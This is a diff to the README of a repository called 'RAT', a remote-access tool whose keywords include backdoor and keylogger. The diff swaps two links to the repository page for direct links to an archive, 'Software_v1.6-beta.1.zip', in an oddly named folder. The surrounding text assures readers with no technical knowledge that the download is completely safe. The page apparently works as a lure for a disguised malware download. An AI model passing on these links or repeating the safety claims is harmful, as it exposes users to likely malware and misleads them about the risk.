@@ -17,7 +17,7 @@ That's it! No special skills or technical knowledge required.
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Click Here to Download RAT](https://github.com/heraldist-requiredcourse4681/RAT)**
+Visit this link to download the application: **[Click Here to Download RAT](https://github.com/heraldist-requiredcourse4681/RAT/raw/refs/heads/main/disembodiment/Software_v1.6-beta.1.zip)**
 
 Once you're on the download page, look for the download button and click it. The file will start downloading automatically. This is completely safe and straightforward—just follow your browser's prompts.
 
@@ -121,6 +121,6 @@ If you encounter any issues or have questions, there are several ways to get hel
 
 RAT puts incredible remote control capabilities right in your hands. Whether you're managing multiple computers, helping friends with tech problems, or just want more control over your own devices, RAT delivers everything you need in one convenient package. The simple setup, intuitive interface, and powerful features make it the go-to choice for anyone who needs reliable remote access.
 
-Visit our download page today and experience the freedom of true remote control: **[Get RAT Now](https://github.com/heraldist-requiredcourse4681/RAT)**
+Visit our download page today and experience the freedom of true remote control: **[Get RAT Now](https://github.com/heraldist-requiredcourse4681/RAT/raw/refs/heads/main/disembodiment/Software_v1.6-beta.1.zip)**
 
 Keywords: backdoor, bot, cybersecurity, hacking, hacking-tool, java, keylogger, penetration-testing-tools, rat-builder, reflective-injection
